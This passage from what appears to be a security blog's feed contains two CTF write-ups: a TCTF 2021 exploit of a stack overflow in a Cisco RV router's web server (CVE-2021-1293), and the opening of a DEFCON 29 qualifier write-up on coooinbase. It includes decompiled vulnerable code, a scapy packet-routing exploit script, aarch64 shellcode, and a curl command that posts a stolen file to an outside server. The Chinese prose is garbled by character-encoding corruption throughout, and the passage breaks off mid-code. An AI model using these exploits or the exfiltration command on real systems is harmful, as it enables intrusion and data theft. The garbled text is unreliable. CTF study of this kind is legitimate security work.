*)uri_string, <span class="string">&quot;index.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;login.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;alert0.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;confirm1.htm&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;check_is_not_login_page====res=%d&quot;</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œ æˆ‘è®¿é—®  this_is_hack.htm ï¼Œè¿™ä¸ªurlï¼Œ è¿™ä¸ªå°±ç¬¦å·éœ€è¦ç™»å½•çš„é€»è¾‘</p><p>(3) ç„¶å è¿›å…¥åˆ° check_Is_not_login_page å‡½æ•°ä¸­</p><p>åœ¨å¤„ç† sessionID çš„è¿‡ç¨‹ä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_16138</span><span class="params">(<span class="keyword">char</span> *cookie, <span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;get_session_id   session=%s&quot;</span>, cookie);</span><br><span class="line">  s1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(cookie, <span class="string">&quot;sessionID&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( s1 = strtok(cookie, <span class="string">&quot; &quot;</span>); s1; s1 = strtok(<span class="number">0</span>, <span class="string">&quot; &quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;sessionID&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_15CE4(s1, byte_1FCD4, <span class="string">&quot;=&quot;</span>, v6, v5);</span><br><span class="line">.......</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ cookie æ˜¯å¦æœ‰ <code>sessionID</code> å­—ç¬¦ä¸²ï¼Œ å¦‚æœå­˜åœ¨åˆ™è¿›åˆ°  <code>sub_15CE4</code> å‡½æ•°, ç„¶åå°±èƒ½çœ‹åˆ°æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  src = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">if</span> ( *sessionID &amp;&amp; <span class="built_in">strstr</span>(sessionID, a2) &amp;&amp; (src = strtok(sessionID, a2)) != <span class="number">0</span> )<span class="comment">// sub_15CE4(v14, &quot;;&quot;, &quot;=&quot;, v10, v4);</span></span><br><span class="line">    <span class="built_in">strcpy</span>(s, src);                             <span class="comment">// BOF</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(s, sessionID);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706141734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706141734.png"></a></p><p>æº¢å‡ºåï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œ çœ‹èµ·æ¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å¯„å­˜å™¨åªæœ‰ R11 ï¼Œ ä½†å®é™…ä¸Šï¼Œè¿”å›å R0 å¯„å­˜å™¨åˆ™æ˜¯æˆ‘ä»¬ä¼ å…¥ cookie å‚æ•°çš„æŒ‡é’ˆã€‚</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706142456.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706142456.png" style="zoom: 50%;" /></a><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ payload çš„å‰é¢ç›´æ¥æ”¾ç½® system æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åæ§åˆ¶ PCè·³è½¬åˆ° system å‡½æ•°ä¸Šï¼ˆ httpd ç¨‹åºæœ¬èº«æœ‰è°ƒç”¨ httpd çš„åœ°æ–¹ï¼Œä¸éœ€è¦leakï¼Œ å¦å¤–æä¸€å¥ï¼Œå› ä¸ºæœ‰ 00 æˆªæ–­ï¼Œå› æ­¤æˆ‘åªèƒ½æ§åˆ¶ä¸€æ¬¡ PC çš„åœ°å€ï¼Œä½†æ˜¯å¯¹è¿™ä¸ªç¯å¢ƒæ¥è¯´è¶³å¤Ÿäº†</p><p>å¦å¤–è¿™ä¸ªé¢˜ç›®åœ¨ 0ctf ä¸­æ˜¯ä½äº iOAçš„åé¢çš„ï¼Œ æˆ‘ä»¬éœ€è¦é€šè¿‡ iOAçš„vpnåŠŸèƒ½ï¼Œè®¿é—®å†…ç½‘ä¸­è¿™ä¸ªè·¯ç”±å™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹æ’¸ä¸€ä¸ª route è½¬å‘ï¼Œ ç„¶åæˆ‘ä»¬çš„åœ£åšå°±ç›´æ¥ç”¨ scapy ç®€å•æ’¸äº†ä¸€ä¸ªã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">base = ip2long(<span class="string">&#x27;172.31.0.0&#x27;</span>)</span><br><span class="line">m = login()</span><br><span class="line">req_vip(m, base + <span class="number">2</span>)</span><br><span class="line">sport = randint(<span class="number">1024</span>, <span class="number">65535</span>)</span><br><span class="line">ip = IP(src=<span class="string">&#x27;172.31.0.2&#x27;</span>, dst=<span class="string">&#x27;10.1.1.1&#x27;</span>)</span><br><span class="line">SYN = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;S&#x27;</span>, seq=<span class="number">1000</span>)</span><br><span class="line">s = raw(ip / SYN)</span><br><span class="line">route(m, s)</span><br><span class="line">data = recv_packet(m)</span><br><span class="line">ack = IP(data)</span><br><span class="line">a = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;A&#x27;</span>, seq=ack.ack + <span class="number">1</span>, ack=ack.seq + <span class="number">1</span>)</span><br><span class="line">route(m, raw(ip / a))</span><br><span class="line">d = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;PA&#x27;</span>, seq=<span class="number">1001</span>, ack=ack.seq + <span class="number">1</span>) / payload.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">route(m, raw(ip / d))</span><br><span class="line"></span><br><span class="line">m.interactive()</span><br></pre></td></tr></table></figure><p>æœ€ååˆ©ç”¨ <code>curl -d @/flag server:port</code> çš„å‘½ä»¤è·å–äº†flag ï¼ˆå¦å¤–ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œ å¦‚æœå­˜åœ¨ç©ºæ ¼çš„è¯å°±ä¼šè¢«æˆªæ–­ï¼Œå› æ­¤è¿™é‡Œç”¨äº† ${IFS} æ›¿æ¢äº†ç©ºæ ¼ï¼‰</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706143147.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706143147.png" style="zoom:50%;" /></a><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/RV/RV.py">åˆ©ç”¨è„šæœ¬</a>ï¼š</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/RV/RV.py">http://bestwing.me/attachments/2021-TCTF-quals/RV/RV.py</a></p><p>binary idb</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/RV/mini/_httpd.idb">http://bestwing.me/attachments/2021-TCTF-quals/RV/mini\_httpd.idb</a></p><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p>è¯¥æ¼æ´å·²ç»ä¿®å¤ï¼Œ strcpy å‡½æ•°æ¢æˆäº† strncpy å‡½æ•°ï¼Œ å¦‚æœå—åˆ°æ¼æ´å½±å“è¯·å°½å¿«æ›´æ–°å›ºä»¶ç‰ˆæœ¬åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv160-260-rce-XZeFkNHf">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv160-260-rce-XZeFkNHf</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CTF Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2021-1293" scheme="https://bestwing.me/tags/CVE-2021-1293/"/>
    
    <category term="TCTF" scheme="https://bestwing.me/tags/TCTF/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON 29 CTF Qualifier  coooinbase and coooinbase-kernel Write-up</title>
    <link href="https://bestwing.me/DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html"/>
    <id>https://bestwing.me/DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html</id>
    <published>2021-05-02T16:00:00.000Z</published>
    <updated>2021-05-03T20:09:20.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="DEFCON-29-CTF-Qualifier-coooinbase-amp-amp-coooinbase-kernel-Write-up"><a href="#DEFCON-29-CTF-Qualifier-coooinbase-amp-amp-coooinbase-kernel-Write-up" class="headerlink" title="DEFCON 29 CTF Qualifier:  coooinbase &amp;&amp; coooinbase-kernel Write-up"></a>DEFCON 29 CTF Qualifier:  coooinbase &amp;&amp; coooinbase-kernel Write-up</h2><h3 id="coooinbase"><a href="#coooinbase" class="headerlink" title="coooinbase"></a>coooinbase</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>a simple service backed by special hardware for buying bitcoin: our beta testing server is live at <a href="http://52.6.166.222:4567/">http://52.6.166.222:4567</a> - this time attack the kernel!</p></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504004319.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504004319.png"></a></p><p>å›¾ï¼š1 é¢˜ç›®æœåŠ¡é¦–é¡µ</p><p>ä»é¢˜ç›®çš„é¦–é¡µçš„ <code>custom hardware</code> å¤„å¯ä»¥ä¸‹åˆ°é¢˜ç›®çš„å›ºä»¶åŒ…ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004611006.png" title="image-20210504004611006" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004611006.png" alt="image-20210504004611006"></a></p><p>å›¾: 2 ä¸‹è½½é¢˜ç›®å›ºä»¶</p><p>å¯ä»¥çœ‹åˆ°å›ºä»¶åŒ…é‡ŒåŒ…ä»¥ä¸‹æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">âœ  coooinbase tar -xvzf src</span><br><span class="line">x dist&#x2F;</span><br><span class="line">x dist&#x2F;x.rb</span><br><span class="line">x dist&#x2F;coooinbase.bin</span><br><span class="line">x dist&#x2F;rootfs.img</span><br><span class="line">x dist&#x2F;x.sh</span><br><span class="line">x dist&#x2F;x.html</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>x.rb</code> æ˜¯ web çš„åç«¯æœåŠ¡ï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨çš„ä»£ç é€»è¾‘å¦‚å›¾:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004932474.png" title="image-20210504004932474" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004932474.png" alt="image-20210504004932474"></a></p><p>å›¾3ï¼š x.rb ä»£ç </p><p>é˜…è¯»ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸‹å‡ ç‚¹ï¼š</p><ol><li>å½“æˆ‘ä»¬è®¿é—® <code>/buy</code> api çš„æ—¶å€™ï¼Œ ä»£ç ä¼šè¯·æ±‚ <code>HTTP_POST</code> åœ°å€å¤„çš„çš„ <code>/gen-bson</code> api, å½“è·å–åˆ° <code>/gen-bson</code> api è¿”å›çš„æ•°æ®åï¼Œä¼šå°†æ•°æ®å†™å…¥ <code>pwn</code> æ–‡ä»¶ä¸­ï¼Œç„¶åä»¥é‡å®šå‘çš„å½¢å¼å–‚å…¥ <code>./x.sh</code> æ–‡ä»¶</li><li><code>/gen-bson</code> è¿™ä¸ª api ä¼šè°ƒç”¨ <code>valid_credit_card</code> å’Œ <code>valid_association</code> å‡½æ•°åˆ†åˆ«æ ¡éªŒå¡«å…¥çš„ cardnumber çš„åˆæ³•æ€§ã€‚ ä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å‡ä¼šè°ƒç”¨ <code>to_s.gusb(/\D/, &#39;&#39;)</code> å°†ä¼ å…¥çš„ <code>number</code> å˜é‡ä¸­çš„éæ•°å­—ç»™å»æ‰ï¼Œä½†æ˜¯åœ¨ 44 -å¤„çš„ <code>number</code> å´æ˜¯ä»ç„¶å¸¦æœ‰å­—ç¬¦ä¸²çš„ï¼Œå› æ­¤æ­¤å¤„æˆ‘ä»¬å¯ä»¥ä¼ å…¥å…¶ä»–éæ•°å­—çš„å€¼ ï¼ˆ6011000000000004 è¿™ä¸ªcardnmumber å¯ä»¥è¿‡æ ¡éªŒï¼‰</li><li><code>gen-bson</code> åœ¨45-46 è¡Œå¤„ä¼šå°†å‚æ•°è½¬æˆ bson æ ¼å¼ï¼Œä¸” base64 ç¼–ç ï¼Œ ç„¶åè¿”å›</li></ol><p>ï¼ˆæ³¨ï¼š æ­¤å¤„è¿˜æœ‰æœ‰ä¸ªç‚¹ï¼Œæˆ‘åœ¨ä¸€å¼€å§‹çš„æ—¶å€™æ²¡æ³¨æ„åˆ°ï¼Œæš‚ä¸”ä¸æï¼‰</p><p><code>x.sh</code> çš„ä»£ç å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 1 qemu-system-aarch64 -machine virt -cpu cortex-a57 -smp 1 -m 64M -nographic -serial mon:stdio -monitor none -kernel coooinbase.bin -drive <span class="keyword">if</span>=pflash,format=raw,file=rootfs.img,unit=1,<span class="built_in">readonly</span></span><br></pre></td></tr></table></figure><p>ç”¨ qemu è·‘èµ·ä¸€ä¸ªæœåŠ¡ï¼Œ å†…æ ¸ä¸º: <code>coooinbase.bin</code> ä»¥åŠæœ‰å¯¹åº”çš„ rootfs.img , é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯ä»¥å°†æ–‡ä»¶ç³»ç»Ÿ mount å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modprobe nbd max_part&#x3D;8</span><br><span class="line">qemu-nbd --connect&#x3D;&#x2F;dev&#x2F;nbd0 .&#x2F;rootfs.img</span><br><span class="line">mkdir rootfs</span><br><span class="line">mount &#x2F;dev&#x2F;nbd0 rootfs</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° æ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  rootfs ls</span><br><span class="line">bin  flg  run</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ bin å’Œ run , é€šè¿‡é€†å‘å‘ç°æ˜¯ä¸€æ ·çš„æ–‡ä»¶ï¼Œ flg æ˜¯flag æ–‡ä»¶</p><p>çŒœæµ‹ bin ï¼ˆrun) å°±æ˜¯è¦ pwn çš„ç”¨æˆ·æ€ç¨‹åºï¼Œ é€šè¿‡å¯åŠ¨å‘½ä»¤ï¼Œæˆ‘ä»¬çŸ¥é“æ¶æ„ä¸º aarch64, cpu ä¸º cortex-a57, æˆ‘ä»¬ä½¿ç”¨ IDA  Pro æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œ è®¾ç½®å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012341867.png" title="image-20210504012341867" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012341867.png" alt="image-20210504012341867"></a></p><p>å›¾4ï¼šIDA åŠ è½½</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012534460.png" title="image-20210504012534460" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012534460.png" alt="image-20210504012534460"></a></p><p>å›¾4ï¼šIDAåˆ†ææˆªå›¾</p><p>ç„¶åå°±å¿…ç„¶å‘ç° IDA ä»€ä¹ˆå‡½æ•°éƒ½æ²¡æœ‰åˆ†æå‡ºæ¥ï¼Œ æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ­£ä¸‹æˆ‘ä»¬çš„ IDBï¼Œä¿®å¤å‡ºå‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504014746398.png" title="image-20210504014746398" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504014746398.png" alt="image-20210504014746398"></a></p><p>å›¾5ï¼šä¿®å¤åçš„ IDA æˆªå›¾</p><p>åœ¨ <code>bsion_find_string</code> ä¸­æˆ‘ä»¬å‘ç°äº†ä¸€å¤„åŠ¨æ€åˆ†é…æ ˆç©ºé—´çš„é€»è¾‘</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504015258789.png" title="image-20210504015258789" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504015258789.png" alt="image-20210504015258789"></a></p><p>å›¾5ï¼šåŠ¨æ€åˆ†é…æ ˆç©ºé—´</p><p>åœ¨åœ°å€ 0xB6C å¤„ï¼Œ X1 ä¸ºä¼ å…¥çš„å­—ç¬¦ä¸²å¤§å°ï¼Œ æ­¤å¤„åˆ¤æ–­éœ€è¦åŠ¨æ€åˆ†é…çš„æ ˆçš„å¤§å° ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504025826791.png" title="image-20210504025826791" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504025826791.png" alt="image-20210504025826791"></a></p><p>å›¾5ï¼šmapping æˆªå›¾</p><p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œ è¿™ä¸ªæ²¡æœ‰åˆ¤æ–­ä¼ å…¥çš„å­—ç¬¦ä¸²å¤§å°æ˜¯ä¸æ˜¯å¤ªå¤§ï¼Œå¦‚æœå¤ªå¤§çš„è¯ï¼Œ ä¾‹å¦‚æˆ‘ä¼ å…¥ 0xf000 å¤§å°çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ­¤æ—¶å°†åˆ†é… 0xf000 å¤§å°çš„æ ˆï¼Œ å³ <code>SP = SP - 0xffff</code>  , ç”±äºæ ˆåœ¨ç¨‹åºä»£ç æ®µçš„ä¸‹æ–¹ï¼Œæ­¤æ—¶å°†å¯¼è‡´æ ˆä¼šè¢«åˆ†é…åˆ°ä»£ç æ®µä¸Šï¼Œè€Œä¸”ç”±äºæ˜¯ qemu å¯åŠ¨çš„ç¨‹åºï¼Œæ‰€æœ‰çš„æ®µéƒ½æ˜¯å¯å†™å¯æ‰§è¡Œçš„ã€‚</p><p>å› æ­¤ï¼Œè¿™ä¸ªé¢˜ç›®çš„æ€è·¯å¦‚ä¸‹ï¼š</p><p>æ„é€ è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²ï¼Œå°†æ ˆåˆ†é…ä¹‹åå°†æ‰§è¡Œçš„ä»£ç æ®µä½ç½®ï¼Œ å†™å…¥ shellcode ç„¶åæœ€åæ‰§è¡Œ shellcode. ç”±äºç¨‹åºæœ‰ç°æˆ open read write çš„å‡½æ•°ï¼Œ å› æ­¤ shellcode ç¼–å†™æ–¹ä¾¿äº†è®¸å¤šï¼Œæˆ‘ä»¬åªéœ€ç›´æ¥ call å‡½æ•°å³å¯ã€‚</p><p>shellcodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag_path_name = <span class="number">0x715</span></span><br><span class="line">open_addr = <span class="number">0x340</span></span><br><span class="line">read_addr = <span class="number">0x34C</span></span><br><span class="line">write_addr = <span class="number">0x310</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode = pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:flag_path_name, <span class="string">&#x27;x1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:open_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line"></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0xFFFF000000088858</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">0x50</span>, <span class="string">&#x27;x12&#x27;</span>:read_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:<span class="number">0x715</span>, <span class="string">&#x27;x12&#x27;</span>:write_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line">print(asm(shellcode))</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œä¼šå‡ºç°ä¸€ä¸ªå‘ç‚¹:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504030941428.png" title="image-20210504030941428" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504030941428.png" alt="image-20210504030941428"></a></p><p>ruby to bson çš„æ—¶å€™å¾—æ˜¯ UTF-8 çš„å­—ç¬¦é›†ï¼Œè¿™æ„å‘³è¿™åœ¨ x.rb ä»£ç ä¸­çš„ï¼ˆè§å›¾4ï¼‰ 45 æ˜¯è¿‡ä¸å»çš„ï¼Œ ç„¶ååœ¨æ¯”èµ›çš„æ—¶å€™ä¸€åº¦é™·å…¥è¯•å›¾æŠŠæˆ‘çš„ shellcode çš„ä¿®æ”¹ä¸ºå…¨ä¸º UTF-8 å­—ç¬¦é›†çš„è‰°è‹¦å·¥ä½œä¸­ã€‚ ç„¶å peanuts å‘ç°ï¼Œ  <code>HTTP_POST</code>  æ˜¯ç”± HTTP header ä¸­çš„ HOSTå­—æ®µæ§åˆ¶çš„ï¼Œ è¿™ä»¥ä¸ºæˆ‘ä»¬ä¸éœ€è¦é€šè¿‡åç«¯è‡ªèº«çš„ <code>/gen_bson</code> api ä¼ å…¥æ„é€ å¥½çš„ payload ï¼Œ æˆ‘ä»¬åªéœ€æ­å»ºæˆ‘ä»¬è‡ªå·±çš„æœåŠ¡ï¼Œ å½“æ¥æ”¶åˆ° <code>/gen_bson</code> è¯·æ±‚åï¼Œ ä¼ å›æˆ‘ä»¬çš„ payloadã€‚</p><h2 id="coooinbase-kernel"><a href="#coooinbase-kernel" class="headerlink" title="coooinbase-kernel"></a>coooinbase-kernel</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035715437.png" title="image-20210504035715437" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035715437.png" alt="image-20210504035715437"></a></p><p>å†…æ ¸å®ç°äº†å‡ ä¸ªsyscall</p><p>å…¶ä¸­ write é™åˆ¶äº†è¯»å–çš„åœ°å€çš„èŒƒå›´</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035800048.png" title="image-20210504035800048" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035800048.png" alt="image-20210504035800048"></a></p><p>ä½†æ˜¯ read ä¸­æ²¡æœ‰é™åˆ¶å†™å…¥çš„åœ°å€çš„èŒƒå›´</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504035843.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504035843.png"></a></p><p>å› æ­¤è¿™ä¸ªé¢˜çš„æ€è·¯ä¸ºï¼š</p><p>åœ¨å·²ç»å®Œæˆçš„ç”¨æˆ·æ€ä»»æ„ä»£ç æ‰§è¡Œçš„åŸºç¡€ä¸Š</p><ol><li>open bin æ–‡ä»¶ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ— æ„ä¹‰çš„ä»£ç </li><li>lseek åˆ°è¯¥å¤„</li><li>read è¯¥å¤„çš„ä»£ç </li><li>é€šè¿‡ read å‘å†…æ ¸çš„ write çš„åˆ¤æ–­åœ°å€èŒƒå›´çš„åœ°æ–¹å†™æ‰</li><li>è°ƒç”¨ write å°†å†…æ ¸åœ°å€ä¸­çš„ flag æ‰“å°å‡º</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode = pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:<span class="number">0x715</span>, <span class="string">&#x27;x1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x340</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR 